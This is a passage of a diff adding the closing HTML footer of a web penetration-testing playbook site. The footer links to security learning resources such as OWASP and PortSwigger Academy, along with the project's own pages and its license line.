+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
